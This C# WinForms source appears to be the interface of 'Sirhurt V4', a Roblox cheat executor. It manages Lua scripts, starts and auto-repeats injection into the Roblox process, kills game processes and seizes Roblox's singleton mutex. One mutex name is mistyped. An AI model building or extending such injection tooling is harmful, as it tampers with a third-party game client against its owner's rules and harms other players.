        private void ToolStripTextBox3_KeyPress(object sender, KeyPressEventArgs e)
        {
            string FullObjPath = $"{Environment.CurrentDirectory}\\Scripts\\{ScriptList.SelectedNode.FullPath}";
            string ItemName = ScriptList.SelectedNode.Text;
            string Out = FullObjPath.Replace(ItemName, "");
            if (e.KeyChar == (char)Keys.Enter)
            {
                if (File.Exists($"{Environment.CurrentDirectory}\\Scripts\\{ScriptList.SelectedNode.FullPath}"))
                    File.Move($"{Environment.CurrentDirectory}\\Scripts\\{ScriptList.SelectedNode.FullPath}", $"{Out}\\{NewText}");
                else if (Directory.Exists($"{Environment.CurrentDirectory}\\Scripts\\{ScriptList.SelectedNode.FullPath}"))
                    Directory.Move($"{Environment.CurrentDirectory}\\Scripts\\{ScriptList.SelectedNode.FullPath}", $"{Out}\\{NewText}");ScriptLoading();
                    
            }
        }

        private void ToolStripTextBox3_TextChanged(object sender, EventArgs e)
        {
            string Txt = toolStripTextBox3.Text;
            if (!string.IsNullOrWhiteSpace(Txt) || !string.IsNullOrEmpty(Txt) || Txt != "")
            {
                NewText = toolStripTextBox3.Text;
            }
        }

        private void treeView1_ItemDrag(object sender, ItemDragEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                DoDragDrop(e.Item, DragDropEffects.Move);
            }

            else if (e.Button == MouseButtons.Right)
            {
                DoDragDrop(e.Item, DragDropEffects.Copy);
            }
        }

        private void treeView1_DragEnter(object sender, DragEventArgs e)
        {
            e.Effect = e.AllowedEffect;
        }

        private void treeView1_DragOver(object sender, DragEventArgs e)
        {
            Point targetPoint = ScriptList.PointToClient(new Point(e.X, e.Y));

            ScriptList.SelectedNode = ScriptList.GetNodeAt(targetPoint);
        }

        private void treeView1_DragDrop(object sender, DragEventArgs e)
        {
            Point targetPoint = ScriptList.PointToClient(new Point(e.X, e.Y));

            TreeNode targetNode = ScriptList.GetNodeAt(targetPoint);

            TreeNode draggedNode = (TreeNode)e.Data.GetData(typeof(TreeNode));

           
            if (!draggedNode.Equals(targetNode) && !ContainsNode(draggedNode, targetNode))
            {
                if (e.Effect == DragDropEffects.Move)
                {
                    if (targetNode == null)
                    {
                        try
                        {
                            File.Move($"{Environment.CurrentDirectory}\\Scripts\\{draggedNode.FullPath}", $"{Environment.CurrentDirectory}\\Scripts\\{draggedNode.Text}");
                        }
                        catch { }
                    }
                    else if (Directory.Exists($"{Environment.CurrentDirectory}\\Scripts\\{targetNode.Text}"))
                    {
                        if (File.Exists($"{Environment.CurrentDirectory}\\Scripts\\{draggedNode.FullPath}"))
                            File.Move($"{Environment.CurrentDirectory}\\Scripts\\{draggedNode.FullPath}", $"{Environment.CurrentDirectory}\\Scripts\\{targetNode.FullPath}\\{draggedNode.Text}");
                        else if (Directory.Exists($"{Environment.CurrentDirectory}\\Scripts\\{draggedNode.FullPath}"))
                            return;
                    }
                    else
                    {
                        MessageBox.Show("Invalid directory!", "Sirhurt V4", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                    }

                }
                if (targetNode != null)
                    targetNode.Expand();
            }
            
        }

        private bool ContainsNode(TreeNode node1, TreeNode node2)
        {
            try
            {
                if (node2.Parent == null) return false;
                if (node2.Parent.Equals(node1)) return true;
                return ContainsNode(node1, node2.Parent);
            }
            catch
            {
                return false;
            }
        }

        private void Watcher_Changed(object sender, FileSystemEventArgs e)
        {
            Console.WriteLine("Called");
            Console.WriteLine(e.ChangeType.ToString());
            
            if (e.ChangeType == WatcherChangeTypes.Created || e.ChangeType == WatcherChangeTypes.Deleted || e.ChangeType == WatcherChangeTypes.Renamed || e.ChangeType == WatcherChangeTypes.Changed)
            {
                ScriptList.Invoke(new Action(() => { ScriptList.Nodes.Clear(); ScriptLoading(); }));
                return;
            }
        }

        public void PopulateTree(string dir, TreeNode node)
        {
            try
            {
                var directory = new DirectoryInfo(dir);
                foreach (var d in directory.GetDirectories())
                {
                    var t = new TreeNode(d.Name);
                    if (node != null) node.Nodes.Add(t);
                    else ScriptList.Nodes.Add(t);
                    PopulateTree(d.FullName, t);
                }

                foreach (var f in directory.GetFiles())
                {
                    var t = new TreeNode(f.Name);
                    if (node != null) node.Nodes.Add(t);
                    else ScriptList.Nodes.Add(t);
                }
            }
            catch
            {
            }
        }

        private void ScriptLoading()
        {
            try
            {
                ScriptList.Nodes.Clear();
                var flag = Directory.Exists(Environment.CurrentDirectory + "\\Scripts");
                if (!flag) Directory.CreateDirectory(Environment.CurrentDirectory + "\\Scripts");
            }
            catch
            { }

            PopulateTree(Environment.CurrentDirectory + "\\Scripts", null);
        }

        private void OpenScripts_Click(object sender, EventArgs e)
        {
            BlueBar.Visible = !BlueBar.Visible;
            Console.WriteLine(OpenScripts.BackgroundImage.Tag);
            if (BlueBar.Visible)
            {
                ScriptLoading();
                OpenScripts.BackgroundImage = Resources.explorer1_white1;
                while (ScriptBoxHolder.Width <= NewWidth && BlueBar.Visible)
                {
                    if (ScriptBoxHolder.Width == NewWidth) break;
                    ScriptBoxHolder.Width += 3;
                    Application.DoEvents();
                }
                ScriptList.Scrollable = true;
            }
            else if (!BlueBar.Visible)
            {
                ScriptList.Scrollable = false;
                OpenScripts.BackgroundImage = Resources.explorer1;
                while (ScriptBoxHolder.Width >= 0 && !BlueBar.Visible)
                {
                    if (ScriptBoxHolder.Width == 0) break;
                    ScriptBoxHolder.Width -= 3;
                    Application.DoEvents();
                }
            }
        }

        public void SirHurtPipe(string script)
        {
            try
            {
                File.WriteAllText("sirhurt.dat", script);
            }
            catch (Exception Oop)
            {
                MessageBox.Show($"Something went wrong: {Oop.ToString()}", "Sirhurt V4", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            }
        }

        private async void runScriptToolStripMenuItem_Click(object sender, EventArgs e)
        {
            runScriptToolStripMenuItem.Font = new Font("Segoe UI", 7, FontStyle.Regular);
            await Task.Delay(25);
            runScriptToolStripMenuItem.Font = new Font("Segoe UI", 9, FontStyle.Regular);
            if (customTabControl1.GetWorkingEditor().Text == "Iris is the only god.")
            {
                IconPanel.Visible = false;
                PicEasterEgg.Visible = true;
                return;
            }
            SirHurtPipe(customTabControl1.GetWorkingEditor().Text);
        }

        private void ScriptList_DoubleClick(object sender, EventArgs e)
        {
            try
            {
                using (var sr = new StreamReader(Environment.CurrentDirectory + $"\\Scripts\\{ScriptList.SelectedNode.FullPath}"))
                {
                    customTabControl1.CreateTab(ScriptList.SelectedNode.Text, sr.ReadToEnd());
                    Console.WriteLine(ScriptList.SelectedNode.Text);
                    Console.WriteLine(sr.ReadToEnd());
                }

            }
            catch { }
        }

        private void Inject_MouseDown(object sender, MouseEventArgs e)
        {
            InjectButton.BackgroundImage = Resources.bitmap_white;
        }

        private async void Inject_MouseUp(object sender, MouseEventArgs e)
        {
            InjectButton.BackgroundImage = Resources.bitmap;
            Thread InjectThread = new Thread(InjectSirHurt);

            InjectThread.Start();

            await Task.Delay(5000);

            if (!attached) {
                MessageBox.Show("Injection failed, the thread has been terminated!");
                runScriptToolStripMenuItem.Image = Resources.red;
            }

            InjectThread.Abort();

        }

        private void newScriptToolStripMenuItem_Click(object sender, EventArgs e)
        {
            customTabControl1.CreateTab();
        }

        private void openFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog sfd = new OpenFileDialog())
            {
                sfd.Filter = "Lua Files (*.lua)|*.lua|Text Files (*.txt)|*.txt|All Files (*.*)|*.*";
                sfd.RestoreDirectory = true;

                if (sfd.ShowDialog() == DialogResult.OK)
                {
                    customTabControl1.CreateTab(Path.GetFileName(sfd.FileName), File.ReadAllText(sfd.FileName));
                }
            }
        }

        private void saveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (customTabControl1.GetWorkingEditor().Text.Contains(".ini"))
            {
                using (var reader = new StreamWriter($"{Environment.CurrentDirectory}\\bin\\schemes\\Settings.ini"))
                {
                    reader.Write(customTabControl1.GetWorkingEditor().Text);
                }
                return;
            }
            if (!Directory.Exists($"{Environment.CurrentDirectory}\\Scripts"))
            {
                Directory.CreateDirectory($"{Environment.CurrentDirectory}\\Scripts");
                using (SaveFileDialog sfd = new SaveFileDialog())
                {
                    sfd.Filter = "Lua Files (*.lua)|*.lua|Text Files (*.txt)|*.txt|All Files (*.*)|*.*";
                    sfd.RestoreDirectory = true;
                    sfd.FileName = customTabControl1.GetTabName();

                    if (sfd.ShowDialog() == DialogResult.OK)
                    {
                        File.WriteAllText(sfd.FileName, customTabControl1.GetWorkingEditor().Text);
                    }
                }
            }
            else
            {
                using (StreamWriter Writer = new StreamWriter($"{Environment.CurrentDirectory}\\Scripts\\{customTabControl1.GetTabName()}"))
                {
                    Writer.Write(customTabControl1.GetWorkingEditor().Text);
                }
            }
        }

        private void saveAsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (SaveFileDialog sfd = new SaveFileDialog())
            {
                sfd.Filter = "Lua Files (*.lua)|*.lua|Text Files (*.txt)|*.txt|All Files (*.*)|*.*";
                sfd.RestoreDirectory = true;
                sfd.FileName = customTabControl1.GetTabName();

                if (sfd.ShowDialog() == DialogResult.OK)
                {
                    File.WriteAllText(sfd.FileName, customTabControl1.GetWorkingEditor().Text);
                }
            }
        }

        private void exitToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                foreach (Process process in Process.GetProcessesByName("RobloxPlayerBeta"))
                    process.Kill();
                foreach (Process process in Process.GetProcessesByName("Sirhurt V4"))
                    process.Kill();
            }
            catch { }
        }
        public void AutoAttachFunc()
        {

            var t2 = new Thread(delegate ()
            {
                for (; ; )
                {
                    Thread.Sleep(100);
                    if (autoInjectToolStripMenuItem.Checked)
                    {
                        Thread.Sleep(2000);
                        InjectSirHurt();
                    }

                    var intPtr = FindWindowA("WINDOWSCLIENT", "Roblox");
                    var num = 0u;
                    GetWindowThreadProcessId(intPtr, out num);
                    if (intPtr == IntPtr.Zero && attached || attachedID != 0u && num != attachedID)
                    {
                        attached = false;
                        MainStrip.Invoke(new Action(() => { runScriptToolStripMenuItem.Image = Resources.red; }));
                    }
                }
            });
            t2.Start();
        }
      
        private void autoInjectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            bool CurrentSetting = autoInjectToolStripMenuItem.Checked;
            ColorClass.MyIni.Write("autoInject", CurrentSetting.ToString().ToLower(), "extra");
            if (CurrentSetting)
            {
                AutoAttachFunc();
            }
        }

        private void topMostToolStripMenuItem_Click(object sender, EventArgs e)
        {
            bool CurrentSetting = topMostToolStripMenuItem.Checked;
            TopMost = CurrentSetting;
            ColorClass.MyIni.Write("topMost", CurrentSetting.ToString().ToLower(), "extra");
        }

        private void creditsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                new CreditsForm().ShowDialog(this);
            }
            catch
            {
                new CreditsForm().Show(this);
            }
        }

        private void joinDiscordToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Process.Start("https://discord.gg/cv36XTD");
        }

        private void killRobloxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Process Proc in Process.GetProcessesByName("RobloxPlayerBeta"))
                Proc.Kill();
        }

        private void languageSettingsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                new LanguageForm().ShowDialog(this);
            }
            catch
            {
                new LanguageForm().Show(this);
            }
        }

        private void otherToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Process.Start($"{Environment.CurrentDirectory}\\bin\\schemes\\Settings.ini");
        }

        private void scriptHubToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                new ScriptHubForm().ShowDialog(this);
            }
            catch
            {
                new ScriptHubForm().Show(this);
            }
        }

        private void multiApplicationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Process Proc in Process.GetProcessesByName("RobloxPlayerBeta"))
                Proc.Kill();
            var MyIni = ColorClass.MyIni;
            MyIni = new Editor.IniFile($"{Environment.CurrentDirectory}\\bin\\schemes\\Settings.ini");
            MyIni.Write("multiApplication", multiApplicationToolStripMenuItem.Checked.ToString().ToLower(), "extra");
            MultiProcess = multiApplicationToolStripMenuItem.Checked;
            if (MultiProcess)
                new Mutex(true, "ROBLOX_singletonMutex");
            else
                new Mutex(false, "ROBLOX_s`gletonMutex");
        }
        private string Base64encode(string str)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(str));
        }

        private string Base64decode(string str)
        {
            return Encoding.UTF8.GetString(Convert.FromBase64String(str));
        }
        private void SaveTabsThatAreUnSaved(TabPage CurrTab)
        {
            int i = 0;
            string TabName = CurrTab.Text;
            TabName = TabName.Replace("*", "");
            string TabEditorText = "";
            try
            {
                TabEditorText = CurrTab.Controls[0].Text;
            }
            catch
            {
                Console.WriteLine($"Failed to grab script {TabName}");
            }
            if (TabEditorText == "") return;
            if (TabName != "" || !string.IsNullOrEmpty(TabName))
            {
                bool Exists = File.Exists($"{Environment.CurrentDirectory}\\Scripts\\{TabName}");
                if (Exists)
                {
                    TabName = TabName.Replace(".lua", $"_{i.ToString()}.lua");
                }

                using (StreamWriter writer = new StreamWriter($"{Environment.CurrentDirectory}\\bin\\{TabName}"))
                {
                    writer.Write(TabEditorText);
                }
            }
            i++;
        }

        private void SaveTabs()
        {
            customTabControl1.SaveAllTabs($"{Environment.CurrentDirectory}\\bin\\scripttemps");
        }

        private void saveTabsOnExitToolStripMenuItem_CheckedChanged(object sender, EventArgs e)
        {
            var MyIni = ColorClass.MyIni;
            MyIni.Write("saveTabsonExit", saveTabsOnExitToolStripMenuItem.Checked.ToString().ToLower(), "extra");
        }

        private void SaveToScriptsMenuStrip_Click(object sender, EventArgs e)
        {
            using (StreamWriter Writer = new StreamWriter($"{Environment.CurrentDirectory}\\Scripts\\{customTabControl1.GetTabName()}"))
            {
                Writer.Write(customTabControl1.GetWorkingEditor().Text);
            }
        }


        private void ScriptHubV2Button_MouseDown(object sender, MouseEventArgs e)
        {
            ScriptHubV2Button.BackgroundImage = Resources.ScriptHub;
        }

        private void ScriptHubV2Button_MouseUp(object sender, MouseEventArgs e)
        {
            ScriptHubV2Button.BackgroundImage = Resources.HubBase;
            try
            {
                new ScriptHubForm().ShowDialog(this);
            }
            catch
            {
                new ScriptHubForm().Show(this);
            }
        }

        private void setParentToScriptsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Console.WriteLine($"{Environment.CurrentDirectory}\\Scripts\\{ScriptList.SelectedNode.FullPath}");
                Console.WriteLine($"{Environment.CurrentDirectory}\\Scripts\\{ScriptList.SelectedNode.Text}");

                string ItemPath = $"{Environment.CurrentDirectory}\\Scripts\\{ScriptList.SelectedNode.FullPath}";
                if (!File.Exists($"{Environment.CurrentDirectory}\\Scripts\\{ScriptList.SelectedNode.Text}"))
                    File.Move(ItemPath, $"{Environment.CurrentDirectory}\\Scripts\\{ScriptList.SelectedNode.Text}");
                else
                    MessageBox.Show("File already exists in directory!", "Sirhurt V4", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            }
            catch { }
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                File.Delete($"{Environment.CurrentDirectory}\\Scripts\\{ScriptList.SelectedNode.FullPath}");
            }
            catch { }
        }

        private void ScriptList_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                ScriptList.SelectedNode = e.Node;
            }
        }

        private void createFolderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!Directory.Exists($"{Environment.CurrentDirectory}\\Scripts\\New Folder"))
                Directory.CreateDirectory($"{Environment.CurrentDirectory}\\Scripts\\New Folder");
        }

        private void ScriptListAdjust_MouseDown(object sender, MouseEventArgs e)
        {
            MDown2 = true;
        }

        private void ScriptListAdjust_MouseUp(object sender, MouseEventArgs e)
        {
            MDown2 = false;
        }

        private void ScriptListAdjust_MouseMove(object sender, MouseEventArgs e)
        {
            if (Cursor.Current.ToString() == "[Cursor: SizeWE]" && MDown2)
            {
                ScriptBoxHolder.Size = new Size(ScriptBoxHolder.Width + (e.Location.X), ScriptBoxHolder.Height);
                NewWidth = ScriptBoxHolder.Width;
                Update();
            }
        }

        private void runScriptToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                SirHurtPipe($"{Environment.CurrentDirectory}\\Scripts\\{ScriptList.SelectedNode.FullPath}");
            }
            catch { }
        }

        private void ToolStripMenuItem1_CheckedChanged(object sender, EventArgs e)
        {
            bool Checkd = toolStripMenuItem1.Checked;
            var wtKey = Registry.CurrentUser.OpenSubKey("Software\\Asshurt", true);

            if (Checkd == true)
            {
                if (wtKey != null)
                {
                    wtKey.SetValue("EnableFPSUnlocker", "1", RegistryValueKind.String);
                    wtKey.Close();
                }
            }
            else
            {
                if (wtKey != null)
                {
                    wtKey.SetValue("EnableFPSUnlocker", "0", RegistryValueKind.String);
                    wtKey.Close();
                }
            }

            var MyIni = ColorClass.MyIni;
            MyIni.Write("fpsUnlocker", toolStripMenuItem1.Checked.ToString().ToLower(), "extra");
        }

    }
}
 